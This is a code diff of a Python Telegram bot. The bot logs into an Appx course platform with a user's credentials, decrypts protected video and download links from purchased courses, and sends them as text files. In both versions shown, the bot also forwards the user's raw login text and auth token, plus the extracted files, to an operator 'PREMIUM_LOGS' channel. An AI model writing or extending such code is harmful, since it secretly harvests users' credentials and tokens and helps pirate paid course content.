@@ -15,16 +15,10 @@ from base64 import b64decode
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 import time 
-from config import PREMIUM_LOGS, join
-from datetime import datetime
-import pytz
+from config import PREMIUM_LOGS
 
-
-
-
-india_timezone = pytz.timezone('Asia/Kolkata')
-current_time = datetime.now(india_timezone)
-time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
+log_channel = PREMIUM_LOGS
+log_channel2 = PREMIUM_LOGS
 
 
 def decrypt(enc):
@@ -79,38 +73,25 @@ async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
     lines = []
     
     try:
-        url = f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0"
-        r4 = await fetch(session, url, hdr1)
+        r4 = await fetch(session, f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0", hdr1)
         
-        if not r4 or "data" not in r4:
-            print(f"Skipping {vi}: No data found.")
-            return
+        if not r4 or not r4.get("data"):
+            print(f"Skipping video ID {vi}: No data found.")
+            return None
 
-        data = r4["data"]
-        vt = data.get("Title", "Untitled")
-
-        # Pick correct fields from real API
-        vl = data.get("download_url_higher_version") or data.get("download_url_lower_version")
-        fl = data.get("video_player_token")
-
+        vt = r4.get("data", {}).get("Title", "")
+        vl = r4.get("data", {}).get("download_link", "")
+        fl = r4.get("data", {}).get("video_id", "")
+        
         if fl:
-            try:
-                dfl = decrypt(fl)
-                final_link = f"https://youtu.be/{dfl}"
-                lines.append(f"{vt}:{final_link}\n")
-            except Exception as e:
-                print(f"Decrypt fail (fl): {e}")
+            dfl = decrypt(fl)
+            final_link = f"https://youtu.be/{dfl}"
+            lines.append(f"{vt}:{final_link}\n")
 
         if vl:
-            try:
-                dvl = decrypt(vl)
-                if ".pdf" not in dvl:
-                    lines.append(f"{vt}:{dvl}\n")
-            except Exception as e:
-                print(f"Decrypt fail (vl): {e}")
-
-    # except Exception as e:
-    #     print(f"Error processing video {vi}: {e}")
+            dvl = decrypt(vl)
+            if ".pdf" not in dvl: 
+                lines.append(f"{vt}:{dvl}\n")
                  
         else:
             encrypted_links = r4.get("data", {}).get("encrypted_links", [])
@@ -283,7 +264,7 @@ async def appex_v5_txt(app, message, api, name):
         
     scraper = cloudscraper.create_scraper() 
     try:
-        mc1 = scraper.get(f"{api_base}/get/get_all_purchasesv2?userid={userid}&item_type=1", headers=hdr1).json()
+        mc1 = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1).json()
         
         
         
@@ -315,23 +296,19 @@ async def appex_v5_txt(app, message, api, name):
                 
                 valid_ids = []
                 if"data" in j1 and j1["data"]:
-                    for ct in mc1["data"]:
-                        course_dt = ct.get("coursedt", [])
-                        if not course_dt:
-                            continue
-                        course_info = course_dt[0]  # each purchase has one course detail
-                        ci = course_info.get("id")
-                        cn = course_info.get("course_name")
-                        cp = course_info.get("course_thumbnail")
-                        start = course_info.get("start_date")
-                        end = course_info.get("end_date")
-                        pricing = course_info.get("price")
-                        if ci and cn:  # only add if both exist
-                            FFF += f"**`{ci}`   -   `{cn}`**\n\n"
-                            valid_ids.append(str(ci))  # make sure it’s a string
-
+                    for ct in j1["data"]:
+                    	i = ct.get("id")
+                    	cn = ct.get("course_name")
+                    	start = ct.get("start_date")
+                    	end = ct.get("end_date")
+                    	pricing = ct.get("price")
+                    	thumbnail = ct.get("course_thumbnail")
+                    	
+                    	FFF += f"**{i}   -   {cn}**\n\n"
+                    	valid_ids.append(i)
                 else:
-                    await message.reply_text("No course found in ID")
+                	
+                	await message.reply_text("No course found in ID")
                 return
         except json.JSONDecodeError as e:
             print(f"JSON decode error: {str(e)}")
@@ -342,8 +319,8 @@ async def appex_v5_txt(app, message, api, name):
 
     dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n{FFF}")
     if len(FFF) <= 4096:
-        await app.send_message(PREMIUM_LOGS, dl)
-        await app.send_message(PREMIUM_LOGS, f"`{token}`")
+        await app.send_message(log_channel, dl)
+        await app.send_message(log_channel2, f"`{token}`")
         editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n{FFF}")      
     else:
         plain_FFF = FFF.replace("**", "").replace("`", "")
@@ -356,7 +333,7 @@ async def appex_v5_txt(app, message, api, name):
             document=file_path,
             caption="Too many batches, so select batch IDs from the text file."
         )
-        await app.send_document(PREMIUM_LOGS, document=file_path, caption="Too many batches.")
+        await app.send_document(log_channel, document=file_path, caption="Too many batches.")
     
         editable1 = None
 
@@ -437,33 +414,23 @@ async def appex_v5_txt(app, message, api, name):
                 elapsed_time = end_time - start_time
                 print(f"Elapsed time: {elapsed_time:.1f} seconds")
                 np = filename1
-                user_id = message.from_user.id
-                mention = f"User ID: {message.from_user.id}"
-                caption = (
-                    f"࿇ ══━━ {mention} ━━══ ࿇\n\n"
-                    f"🌀 APP NAME : {app_name}\n"
-                    f"============================\n\n"
-                    f"🎯 BATCH NAME : {raw_text2}_{txtn}\n\n"
-                    f"🌐 JOIN US : {join}\n"
-                    f"⌛ TIME TAKEN : {elapsed_time:.1f} seconds\n\n"
-                    f"❄️ DATE : {time_new}"
+            
+                c_text = (
+                    f"**APP NAME: <b>{app_name}</b>**\n"
+                    f"**BatchName:** {raw_text2}_{txtn}\n"
+                    f"**Validity Start:**{start}\n"
+                    f"**Validity Ends:**{end}\n"
+                    f"Elapsed time: {elapsed_time:.1f} seconds\n"
+                    f"**Batch Price:** {pricing}\n"
+                    f"**course_thumbnail:** <a href={cp}>Thumbnail</a>"
                 )
-             #   c_text = (
-                    #f"**APP NAME: <b>{app_name}</b>**\n"
-                  #  f"**BatchName:** {raw_text2}_{txtn}\n"
-                    #f"**Validity Start:**{start}\n"
-                  #  f"**Validity Ends:**{end}\n"
-                   # f"Elapsed time: {elapsed_time:.1f} seconds\n"
-                  #  f"**Batch Price:** {pricing}\n"
-                    #f"**course_thumbnail:** <a href={cp}>Thumbnail</a>"
-               # )
             
                 try:
                     await input2.delete(True)
                     await m1.delete(True)
                     await m2.delete(True)
-                    await app.send_document(message.chat.id, filename1, caption=caption)
-                    await app.send_document(PREMIUM_LOGS, filename1, caption=caption)
+                    await app.send_document(message.chat.id, filename1, caption=c_text)
+                    await app.send_document(log_channel, filename1, caption=c_text)
                     
             
                 except Exception as e:
